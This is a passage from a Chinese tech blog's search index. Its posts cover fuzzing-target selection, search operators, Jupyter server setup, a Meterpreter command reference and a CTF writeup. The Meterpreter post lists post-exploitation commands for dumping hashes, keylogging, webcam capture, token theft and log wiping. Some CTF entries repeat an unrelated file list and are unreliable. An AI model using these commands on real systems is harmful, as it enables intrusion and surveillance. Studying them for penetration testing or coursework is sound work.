Wiki简体中文)\n","categories":["Configuration"],"tags":["Linux"]},{"title":"常见开源软件和开源库的调用关系","url":"/2020/11/16/%E5%B8%B8%E8%A7%81%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%92%8C%E5%BC%80%E6%BA%90%E5%BA%93%E7%9A%84%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/","content":"开源社区有着许多开源软件，我将优先从以下几个角度去挑选开源软件，并找寻它们之间的依赖与调用关系：\n\n\n支持AFL进行Fuzzing的开源软件(参考https://github.com/aflgo/oss-fuzz/tree/master/projects)\n提供文件操作API或者网络通信API的开源工具。因为它们所涉及的文件读取和通信协议栈往往更容易产生crash\n体积不大，易于源码安装\n\n1 开源软件挑选import osimport yamldef checkAflSupport(dirname):    try:        f = open(dirname + &#x27;/project.yaml&#x27;, &#x27;r&#x27;)        data = yaml.load(f)    except:        # print(&#x27;there is no project.yaml in %s&#x27; %dirname)        pass    try:        if &#x27;afl&#x27; in data[&#x27;fuzzing_engines&#x27;]:            toolname = dirname.split(&#x27;/&#x27;)[-1]            print(toolname)    except:        # print(&#x27;there is no fuzzing_engines given&#x27;)        passif __name__ == &quot;__main__&quot;:    proj_dir = &#x27;./projects&#x27;    projects = os.listdir(proj_dir)    for proj_name in projects:        if os.path.isdir(proj_dir + &#x27;/&#x27; + proj_name):            checkAflSupport(proj_dir + &#x27;/&#x27; + proj_name)\n采用parseFuzzProj.py脚本拉取oss-fuzz中支持AFL的开源软件，得到如下软件列表：\nbinutils brotli brunsli bzip2c-ares capstone cjson cmarkgraphicsmagick grok harfbuzzhermes hostapjbig2dec json-clcms libcbor libexif libfdk-aac libidn2 libldac libpcap libplist libspectre libtasn1 libteken libwebp libxml2 libyaml libyuv lz4miniz monero mupdfnanopb ndpi nestegg nghttp2 ntpopenjpeg openthread opus otspcre2 pffft proxygenqubes-osrnpspeex stbtidy-html5 tor tremorunicorn usrsctpvorbiswireshark woff2 wolfssl wuffsxzyajl-rubyzlib zlib-ng zstd\n挑选与文件操作和网络通信相关的开源软件：\n# 文件操作相关的开源软件binutils bzip2groklibyaml libxml2 libjson-c3xzzlib# 网络通信相关的开源软件fastnetmonlibpcap libndpi wireshark\n2 软件依赖关系查找软件之间的调用关系即依赖关系，我们可以借助包管理工具apt来查找开源软件的依赖有哪些以及被哪些软件依赖：\n\n查询镜像源是否有某款开源软件SOFTWARE：\nsudo apt-cache search SOFTWARE_NAME | grep SOFTWARE_NAME\n\n查询某款开源软件SOFTWARE的依赖：\nsudo apt-cache depends SOFTWARE_NAME | grep Depends\n\n查询某款开源软件SOFTWARE被哪些软件依赖：\nsudo apt-cache rdepends SOFTWARE_NAME\n\n\n3 开源软件依赖组合分析3.1 libpcap依赖与被依赖depends：\n\nlibc6\n\nrdepends：\n\nwireshark-qt，wireshark-gtk，tshark\ntcpdump，tcpreplay\nsnort，suricata，fastnetmon\nnmap\n\n代码相似性\n与Nmap：\nnetmap/libpcap与libpcap仓库下有大量同名.c代码文件，且有若干同名目录\n\n\n\n\n\n与suricata：\n\nsource-pcap.c中存在libpcap的API调用\n\n\n与wireshark：\n\nwireshark/writecap/pcapio.c存在libpcap magic number等相关字段和结构体\nwireshark/capture_opts.c\n\n\n\nTODO…","categories":["Notes"],"tags":["Fuzz"]},{"title":"搜索引擎高级搜索技巧","url":"/2021/01/20/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/","content":"常见搜索引擎Google和Baidu的高级搜索技巧\n\n1 逻辑匹配根据匹配逻辑可分为：精准，屏蔽，模糊和排他匹配\n1.1 精准搜索\n指令：&quot;关键词&quot;\n作用：完全比配双引号中的内容，也即必须包含该内容\n\n1.2 屏蔽搜索\n指令：-关键词\n作用：屏蔽-号后面的内容，注意-号前需有空格，而后面的关键词需紧跟着-号\n\n1.3 模糊搜索\n指令：*关键词\n作用：模糊搜索通配符*接着关键词的内容，同样注意空格和关键词紧跟着通配符\n\n1.4 排他搜索\n指令：OR\n作用：通过OR分隔两个搜索关键词，只会出现其中一个的搜索结果\n\n2 搜索位置根据搜索的位置，可分为：站内，标题，网址和正文搜索\n2.1 站内搜索\n指令：site:网站地址\n作用：在目标网站内搜索相关内容\n\n2.2 标题搜索\n指令：intitle:关键词\n作用：关键词必须出现在网站标题中\n\n2.3 网址搜索\n指令：inurl:关键词\n作用：关键词必须出现在网页url中\n\n2.4 正文搜索\n指令：intext:关键词\n作用：关键词必须出现在网页正文中\n\n3 其它最后则是其它搜索方式，如搜索指定类型的文件\n3.1 搜索文件类型\n指令：filetype:文件类型\n作用：搜索指定文件类型的文件\n\n","categories":["Tricks"],"tags":["Tricks"]},{"title":"搭建Jupyter-Notebook服务器","url":"/2020/06/02/%E6%90%AD%E5%BB%BAJupyter-Notebook%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"在自己的云服务器上搭建Jupyter-Notebook服务器有以下几个好处：\n\n\n充分利用云服务器的计算和存储资源\n统一代码环境和数据集（在不同终端机器上构建的环境是可能不一致的）\n能够随时随地访问（只要ECS还没过期&amp;你的机器能上网）\n\n1 环境搭建1.1 安装Python虽然阿里云的Ubuntu 18.04 云服务器是自带python2.7和python3.6的，但我还是选择安装miniconda3(官网)，理由如下：\n\nanaconda便于管理多版本且隔离的python环境（除此以外virtualenv和pyvenv也可，但管理方式不如conda）\nminiconda比anaconda轻量，它仅包含conda和python和少量依赖包与软件包\n\n# 从官方站点下载速度较慢，可从国内镜像站下载miniconda3-py38 64-bitwget -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-py38_4.9.2-Linux-x86_64.sh# 添加当前用户可执行权限chmod u+x ./Miniconda3-py38_4.9.2-Linux-x86_64.sh# 执行安装脚本，依照提示完成安装./Miniconda3-py38_4.9.2-Linux-x86_64.sh# 添加环境变量(非zsh用户)，若你正在使用zsh请将/etc/profile替换为~/.zshrcsudo echo &quot;export PATH=$PATH:/home/$USER/miniconda3/bin&quot; &gt;&gt; /etc/profile &amp; source /etc/profile\n完成miniconda3的安装之后，需要使用update-alternatives配置多版本Python的优先级，将conda的python3.8设为默认python：\n# 查看是否已经建立了python的alternative管理，若无则创建sudo update-alternatives --config python# 依次创建自带python2，python3以及miniconda3的python3的alternatives管理，最后的数字为优先级，越大越高sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 2sudo update-alternatives --install /usr/bin/python python /home/$USER/miniconda3/bin/python3 3\n1.2 安装Jupyter在命令行中输入python -V和pip -V 确认能够看到正在使用miniconda3的python和pip\n# pip换国内源以提速，在~/.pip/pip.conf中添加以下内容，文件不存在则创建[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple# 安装jupyterpip install jupyter\n2 配置Jupyter-Notebook2.1 配置登陆密码为了保障远程访问云服务器Jupyter服务的安全性，我们需要为notebook设定密码。（该密码会在登陆Jupyter服务时要求用户输入，若与服务器上存储的hash值匹配则放行）\n以下是借助IPython.lib中的passwd函数来生成密码的sha1 code：\nPython 3.8.5 (default, Sep  4 2020, 07:30:14)[GCC 7.3.0] :: Anaconda, Inc. on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from IPython.lib import passwd&gt;&gt;&gt; passwd()Enter password:Verify password:&#x27;sha1:..............YOUR-HASH-CODE....................&#x27;&gt;&gt;&gt;\n2.2 生成配置文件# 生成 /home/$USER/.jupyter/jupyter_notebook_config.py 配置文件jupyter notebook --generate-config\n由于该配置文档的所有内容均默认注释，因此可以把我们自己的配置集中追加到文尾：\n#--------------------------------------------------------------------------# User configuration#--------------------------------------------------------------------------c.NotebookApp.ip = &#x27;*&#x27;                               # notebook监听的IPc.NotebookApp.port = 8888                               # notebook监听的端口c.NotebookApp.notebook_dir = &#x27;/path/to/project-dirs&#x27; # notebook的工作目录c.NotebookApp.open_browser = False                   # 运行notebook服务时不打开浏览器c.NotebookApp.password = u&#x27;sha1:c63cf.....45b09bed&#x27;  # 密码的hash 值\n \n  \n    注意：notebook_dir即为notebook的/，因此为了保证安全性，请将notebook的工作目录设为非重要目录，如你可以创建一个~/jupyter-projects\n\n   \n完成配置之后可以启动notebook并访问啦：\n# 使用jupyter-notebook也是一样的jupyter notebook# 或者更优雅一点nohup jupyter notebook &gt;&gt; ~/.notebook.log 2&gt;&amp;1 &amp;\n \n  \n    注意：记得在云服务器控制台的安全组中配置规则放行notebook监听的8888端口\n\n   \n2.3 撰写systemd服务脚本将以下内容写入/usr/lib/systemd/system/notebook.service，若目录不存在则手动创建\n[Unit]Description=My notebook serviceAfter=network.target[Service]#Type=simple  # default simpleUser=qgrainGroup=qgrainExecStart=/home/qgrain/miniconda3/bin/jupyter-notebookRestart=on-failureRestartSec=10s[Install]WantedBy=multi-user.target\n然后配置notebook.service自启动\nsudo systemctl enable notebooksudo systemctl [start|stop|restart|status] notebook\n3 主题美化⭐3.1 安装jupyter-themes参考Git开源项目：jupyter-themes\n# 安装jupyter-themespip install jupyter-themes# 更新jupyter-themes至latestpip install --update jupyter-themes\n3.2 配置主题jupyter-themes有以下几条关键命令，具体Usage请见其git仓库的README：\n# 查看所有主题jt -l# 将主题配置为monokaijt -t monokai# 我的配置命令如下，这样的notebook界面极其舒适 ヾ(´▽｀)jt -t monokai -f roboto -fs 12 -nfs 14 -tfs 13 -ofs 11 -dfs 10 -cellw 66% -T -N -kl\n \n  \n    其中参数含义依次为设置主题为monokai，设置代码字体为roboto，设置代码字号为12，设置notebook字号为14，设置文本/Markdown字号为13，设置输出字号为11，设置Pandas Dataframe字号为10，设置cell宽度为屏幕的66%，设置Toolbar可见，设置Name&amp;Logo可见以及设置Kernel Logo可见\n\n   \n具体界面效果如下（当然，passwd我为了测试，输入的是123）：\n\n4 参考[1] Ming’s Blog | 搭建 ipython/jupyter notebook 服务器\n[2] Zhiyu’s Blog | 编写systemd服务脚本 \n[3] 知乎 |【内容引起舒适】让你的Jupyter Notebook不再辣眼睛\n","categories":["Tutorial"],"tags":["Selfhosted"]},{"title":"【渗透】meterpreter命令详解","url":"/2019/11/14/%E6%B8%97%E9%80%8F-meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/","content":"1 简介meterpreter是一个为攻击者提供交互性shell以便于在目标机器上执行代码的命令行工具。\n它通过注入特定的payload到目标机器内存中的DLL，来实现控制。\n\n2 命令\nhelp：获取帮助文档，里面包含了所有的meterpreter的命令的功能\n\n2.1 Core Commands\nmeterpreter &gt; ?  帮助菜单\nmeterpreter &gt; background 将当前session置于后台\nmeterpreter &gt; bgkill kill掉后台某meterpreter的会话\nmeterpreter &gt; bgrun 以后台线程的身份执行一个meterpreter的脚本\nmeterpreter &gt; channel 显示或控制所有活动的channel\nmeterpreter &gt; [read|write] 从channel中读出数据|向channel中写入数据\nmeterpreter &gt; close 关闭一个channel\nmeterpreter &gt; [enable|disable]_unicode_encoding\nmeterpreter &gt; [set|get]_timeouts\nmeterpreter &gt; [uuid|guid]\nmeterpreter &gt; info\nmeterpreter &gt; irb\nmeterpreter &gt; load\nmeterpreter &gt; machine_id\nmeterpreter &gt; migrate\nmeterpreter &gt; pivot\nmeterpreter &gt; resource\nmeterpreter &gt; run\nmeterpreter &gt; sessions\nmeterpreter &gt; transport\n\n2.2 File System Commandsmeterpreter &gt; catmeterpreter &gt; cdmeterpreter &gt; checksummeterpreter &gt; [cp|lcd]meterpreter &gt; dirmeterpreter &gt; [ls|lls]meterpreter &gt; [download|upload]meterpreter &gt; editmeterpreter &gt; [getlwd|getwd]meterpreter &gt; [pwd|lpwd]meterpreter &gt; [mkdir|rmdir]meterpreter &gt; mvmeterpreter &gt; rmmeterpreter &gt; searchmeterpreter &gt; show_mount\n2.3 Networking Commands\narp\ngetproxy\nifconfig\nipconfig\nnetstat\nportfwd\nresolve\nroute\n\n2.4 System Commands\nclearev\ndrop_token\nexecute\ngetenv\ngetpid\ngetprivs\ngetsid\ngetuid\nkill\nlocaltime\npgrep\npkill\nps\nreboot\nreg\nrev2self\nshell\nshutdown\nsteal_token\nsuspend\nsysinfo\n\n2.5 User interface Commands\nenumdesktops\ngetdesktop\nidletime\nkeyscan_[dump|start|stop]\nscreenshot\nsetdesktop\nuictl\n\n2.6 Webcam Commands\nrecord_mic\nwebcam_chat\nwebcam_list\nwebcam_snap\nwebcam_stream\n\n2.7 Audio Poutput Commands\nplay\n\n2.8 Elevate Commands\ngetsystem\n\n2.9 Password database Commands\nhashdump\n\n2.10 Timestomp Commands\ntimestomp\n\n","categories":["Security"],"tags":["Kali","Penetration"]},{"title":"网络攻防基础CTF测验Writeup","url":"/2022/05/23/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80CTF%E6%B5%8B%E9%AA%8CWriteup/","content":"国科大2022年春季学期《网络攻防基础》课程CTF测验writeup。\n\n\n《网络攻防基础》是网络空间安全学科研究生的专业核心课，主讲教师有国家计算机网络入侵防范中心主任张玉清教授、信工所六室龚晓锐高级工程师和信工所国重吴槟副研究员。本课程讲授软件安全的基本原理、软件防御机制与攻击手段的博弈演进、软件脆弱性（漏洞）原理分析，以及确保软件安全性的最佳实践方法。课程以软件安全国际知名学者Gary McGraw的三部著作为教材，让同学通过课程学习与动手实践，深入理解软件的安全内构(building security in)本质与方法，提升在开发过程中确保软件安全性的专业技能；同时，理解软件的漏洞利用与防范在网络空间攻防对抗中的关键地位，掌握围绕软件攻防的“白帽”与“黑帽”思维方法和基本技术，为进一步研习网络攻防奠定基础。\n\n本次CTF测验共分9个小组，每组各出一题，其中我们组出的是一道docker逃逸的misc题。\nCrypto RSA1 题目分析\n题目：\n\ncipher.txt：密文文件\nrsa.py：代码文件\n\n\n阅读题目rsa.py代码文件可以得到以下信息：\n\n公钥（n, e）已知，而p、q、d未知\n明文是一张bmp图片的txt格式，经过libns2n转换之后加密为密文cipher.txt\n\n2 解题过程破解私钥d由于n不太大，尝试直接分解。在factordb在线分解得到的结果并没有成功，因此转而尝试yafu分解。\n\n成功得到p和q，然后使用gmpy2求模逆元得到d：\n# e = 65537# p = 113701434566953302296018327231919974281008636789018283600308658084922136632147# q = 113701434566953302296018327231919974281008636789018283600308658084922136631993d = gmpy2.invert(e, (p-1) * (q-1))# d = 1766291671224035950065700331363806177388399874464968761882845653559427747468578334624297389288081148192811346008992354282683301619956371502784830383326817\n解密明文m现已知密钥（n，d），直接逐行对cipher.txt进行解密即可得到flag.bmp.txt如下：\n\n结合42 4D文件头以及文件名中的提示，还原得到flag.bmp如下：\n\n看到三个二维码定位角，使用StegSolve在红色通道Red Plane 0看到二维码，扫码即得到了flag。\n\n题解：\n\nrsa-solution.py，解题脚本\nCrypto-RSA.pptx，题目讲解\n\n\nReverse babyandroid\n题目：\n\nbabyAndroid.apk：题目文件\n\n\n1 逆向分析直接用jadx反编译babyAndroid.apk，看到主要代码在com.example.myapplication里：\n\n\n题解：\n\nbbandroid-solution.java：解题脚本\n\n\nReverse baguatu\n题目文件：\n\ncipher.txt：密文文件\nrsa.py：代码文件\n\n题目文件：\n\ncipher.txt：密文文件\nrsa.py：代码文件\n\n\nWeb newsSQL数字型注入+md5校验绕过+assert命令执行的一道缝合怪，没啥难度。由于我写博客的时候已经是课程实验之后的第N天（老拖延症）服务器都关了，所以我就只挑其中两个手上有图的知识点记录一下。\n1 md5校验绕过2 assert命令执行Misc 密不透风的Docker\n题目文件：\n\ncipher.txt：密文文件\nrsa.py：代码文件\n\n题目文件：\n\ncipher.txt：密文文件\nrsa.py：代码文件\n\n\n","categories":["CTF"],"tags":["CTF","Writeup"]}]